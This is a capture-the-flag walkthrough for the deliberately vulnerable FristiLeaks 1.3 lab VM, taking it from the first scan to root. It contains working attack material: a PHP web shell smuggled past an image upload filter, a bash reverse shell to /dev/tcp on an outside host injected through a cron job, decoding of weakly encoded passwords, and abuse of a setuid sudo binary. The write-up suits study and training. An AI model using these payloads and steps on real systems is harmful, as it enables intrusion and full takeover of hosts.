This is a writeup for VulnHub's [FristiLeaks: 1.3](https://www.vulnhub.com/entry/fristileaks-13,133/) challenge.

### Host and Service Discovery

I don't think that we really need to cover this, as the IP address of the host is clearly written in the logon prompt after the virtual machine boots up. But here's how to find the IP address without looking at the VM's screen.

~~~
$ arp -v

Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.0.106            ether   08:00:27:a5:a6:76   C                     wlan0
192.168.0.1              ether   c0:4a:00:65:77:d6   C                     wlan0
Entries: 2  Skipped: 0  Found: 2
~~~

Then, we can proceed to scanning for services.

~~~
$ sudo nmap -T5 -A -v 192.168.0.106 -p 0-65535

~~~

The host only has port 80 open.

### The Web Application

I started checking the web application with a browser and running Nikto on it. Nikto doesn't give me anything useful. We got this image on the homepage, along to some references to Twitter.

![Keep-Calm](/images/posts/fristileaks-keep-calm.png)

If we check the page source, we can see that the image is located on `/images` directory. The directory is vulnerable to directory indexing, hence we can see that the there's a picture of Obi-Wan Kenobi there.

![Obi-Wan](/images/posts/fristileaks-obi-wan.jpg)

On the `robots.txt`, we can see three paths are disallowed.

~~~
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
~~~

Opening any of the disallowed paths will bring us to a page displaying Obi-Wan's image.

Since Nikto doesn't give me anything useful and all of the disallowed paths are named after drinks, I figured that I'd try `/fristi`. And I got a login page with this image.

![Ha-Ha](/images/posts/fristileaks-ha-ha.jpg)

### The Login Page

Check the source code of the page, notice that the developer left us a message.

~~~html
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

-->
~~~

And the meta tag is a huge clue for us.

~~~html
<meta name="description" content="super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.">
~~~

Under the Ha-Ha image's tag, there's another image encoded in base64 commented.

Open the HTML file in a browser. We'll se an image displaying this string.

~~~
keKkeKKeKKeKkEkkEk
~~~

So this is our web login credentials.

~~~

### File Uploader

After logging in, we'll find a file uploader. It claims to only accept `png`, `jpg`, and `gif` image files. But we can upload files of other extensions by adding `.png`, `.jpg`, or `.gif` at the end of the filename. Uploaded files will be available on `/fristi/uploads` directory.

I tried uploading a PHP file named `shell.php.jpg`. Here's the content of the file.

~~~php
<pre>
<?php
  echo shell_exec($_GET['cmd']);
?>
</pre>
~~~

If I open `/fristi/uploads/shell.php.jpg`, it is displayed as a web page instead of an image. I can run shell commands from the `cmd` parameter. Running `whoami` will show us that we have the privilege of a user named apache.

### Reverse Shells

I decided to upload [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) to the site with Netcat listening on my host. Then I browsed the files and found that `/home/eezeepz` is accessible.

On `/home/eezeepz`, there's a file called `note.txt`.

~~~
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
~~~

So the good news is, we can put a command in a file named `runthis` in `/tmp` directory, and it will be run with privileges of a user called admin.

I tried to this command in the `runthis` file.

~~~bash
/bin/bash -i >& /dev/tcp/192.168.0.107/6666 0>&1
~~~

But when it's run, the `cronresult` shows that it's not successful (my listener doesn't get any incoming connection too).

~~~
command did not start with /home/admin or /usr/bin
~~~

Well, Jerry did say that he only allow commands from /usr/bin/ or /home/admin/. So I tried this instead.

~~~bash
/usr/bin/dir && /bin/bash -i >& /dev/tcp/192.168.0.107/6666 0>&1
~~~

Start Netcat to listen at port 6666.

~~~
$ nc -lvp 6666
~~~

Wait a minute for the connection, and we got the reverse shell.

### Admin

So we got the access to `/home/admin` with the reverse shell from cron with Jerry's privilege. There are a few interesting files there.

#### 1. whoisyourgodnow.txt

~~~
=RFn0AKnlMHMPIzpyuTI0ITG
~~~

Seems like a reversed base64-encoded string.

#### 2. cryptedpass.txt

~~~
mVGZ3O3omkJLmy2pcuTq
~~~

Seems like it's encrypted using the `cryptpass.py` script.


#### 3. cryptpass.py

~~~python
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
~~~

### Decrypting the Passwords

It's pretty clear that the string in `cryptedpass.txt` is encrypted by using `cryptpass.py`. So to decrypt that, we need to reverse the process.

Using the Python shell in my host, doing this will return the plaintext of the `cryptedpass.txt` file.

~~~python
import base64,codecs,sys

ciphertext = 'mVGZ3O3omkJLmy2pcuTq'
decoded_codecs = codecs.encode(ciphertext[::-1], 'rot13')
plaintext = base64.b64decode(decoded_codecs)
print plaintext
~~~

It returned a plaintext which happens to be the password for the user named admin (Jerry's user).

~~~
thisisalsopw123
~~~

And I tried to do the same for the crypted string in `whoisyourgodnow.txt`.

~~~python
import base64,codecs,sys

ciphertext = '=RFn0AKnlMHMPIzpyuTI0ITG'
decoded_codecs = codecs.encode(ciphertext[::-1], 'rot13')
plaintext = base64.b64decode(decoded_codecs)
print plaintext
~~~

It returned this plaintext.

~~~
LetThereBeFristi!
~~~

I thought that it was the root's password because of the name of the file, but it doesn't seem to be it. But I checked the file once again and see that it belongs to the user fristigod. I can su to fristigod now.

But before that, I must spawn a TTY.

~~~
$ python -c 'import pty;pty.spawn("/bin/bash")'
~~~

### Fristigod

We started in `/var/fristigod` directory when switching user to fristigod.

~~~
$ ls -alh

total 16K
drwxr-x---   3 fristigod fristigod 4.0K Nov 25 05:55 .
drwxr-xr-x. 19 root      root      4.0K Nov 19 01:41 ..
-rw-------   1 fristigod fristigod  864 Nov 25 06:09 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4.0K Nov 25 05:53 .secret_admin_stuff
~~~

That `.secret_admin_stuff` directory seems interesting. I changed the directory and checked what's inside.

~~~
$ ls -alh

total 16K
drwxrwxr-x. 2 fristigod fristigod 4.0K Nov 25 05:53 .
drwxr-x---  3 fristigod fristigod 4.0K Nov 25 05:55 ..
-rwsr-sr-x  1 root      root      7.4K Nov 25 05:53 doCom
~~~

An executable file owned by root and is able to be run with root's privilege. Perfect!

But simply running `doCom` will give us this.

~~~
Nice try, but wrong user ;)
~~~

I tried checking the strings inside the executable.

~~~
$ strings doCom

/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setuid
exit
strcat
stderr
system
getuid
fwrite
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
Nice try, but wrong user ;)
Usage: ./program_name terminal_command ...
~~~

It doesn't seem to run any other program in the system that I can easily trick it to giving me root shell. But seems like it acts as a proxy to run shell commands as root for the right user.

I tried using sudo with fristigod, and I found out that fristigod is a sudoer (but with a very limited permission).

~~~
$ sudo -l -U fristigod

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE

    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
~~~

The user fristigod is allowed to run `doCom` as fristi. Let's try that.

~~~
$ sudo -u fristi ./doCom
~~~

And we got the right response.

~~~
Usage: ./program_name terminal_command ...
~~~

Try checking our privilege when executing the command with `doCom`.

~~~
$ sudo -u fristi ./doCom id

uid=0(root) gid=100(users) groups=100(users),502(fristigod)

$ sudo -u fristi ./doCom whoami

root
~~~

### Getting the Flag

As root, we're able to access the `/root` directory and check its contents. And here's our flag file, stored in that directory.

~~~
$ sudo -u fristi ./doCom ls /root

fristileaks_secrets.txt
~~~

Time to get our flag.

~~~
$ sudo -u fristi ./doCom cat /root/fristileaks_secrets.txt
~~~

And here's it is!

~~~
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1



~~~

By the way, I could just spawn a root shell with `doCom` instead of doing things one by one like that.

~~~
$ sudo -u fristi ./doCom /bin/bash
~~~

I wonder if I managed to finish it in 4 hours. I did it in three days, around one or two hours per day. But well, it's finished though.
